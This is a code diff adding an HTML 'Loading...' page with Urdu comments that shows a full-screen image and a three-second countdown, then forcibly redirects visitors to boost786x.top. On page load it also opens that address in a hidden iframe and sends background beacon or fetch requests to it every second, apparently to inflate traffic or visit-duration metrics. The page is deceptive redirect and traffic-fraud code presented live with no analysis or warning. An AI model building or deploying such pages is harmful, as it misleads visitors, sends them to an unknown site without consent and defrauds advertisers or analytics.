@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  
+  <!-- تصویر کی تیز ترین پیشگی لوڈنگ -->
+  <link rel="preload" as="image" href="image_03.webp" fetchpriority="high">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+    }
+    #main-image {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      cursor: pointer;
+      display: block;
+      z-index: 1;
+      /* امیج رینڈرنگ کی تیز ترین سپیڈ */
+      content-visibility: auto;
+    }
+    .countdown-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 70px;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 50%;
+      z-index: 10;
+      pointer-events: none;
+    }
+    #countdown-number {
+      font-size: 32px;
+      font-weight: bold;
+      color: #ffffff;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- تصویر کی فاسٹ رینڈرنگ -->
+  <img id="main-image" src="image_03.webp" alt="" fetchpriority="high" loading="eager" onclick="goToTarget()">
+
+  <!-- کاؤنٹ ڈاؤن -->
+  <div class="countdown-box">
+    <span id="countdown-number">3</span>
+  </div>
+
+<script>
+const CONFIG = {
+  targetLink: "https://boost786x.top/boost55abc/?utm_source=B.&utm_medium=B.new"
+};
+
+(function () {
+  startCountdown(3);
+  startDurationBooster();
+})();
+
+function startCountdown(seconds) {
+  let timeLeft = seconds;
+  const numDisplay = document.getElementById("countdown-number");
+
+  const timer = setInterval(() => {
+    timeLeft--;
+    if (timeLeft > 0) {
+      numDisplay.textContent = timeLeft;
+    } else {
+      numDisplay.textContent = "0";
+      clearInterval(timer);
+      goToTarget();
+    }
+  }, 1000);
+}
+
+function startDurationBooster() {
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.src = CONFIG.targetLink;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+  } catch (e) {}
+
+  setInterval(() => {
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(CONFIG.targetLink);
+    } else {
+      fetch(CONFIG.targetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
+    }
+  }, 1000);
+}
+
+function goToTarget() {
+  window.location.href = CONFIG.targetLink;
+}
+</script>
+
+</body>
+</html>
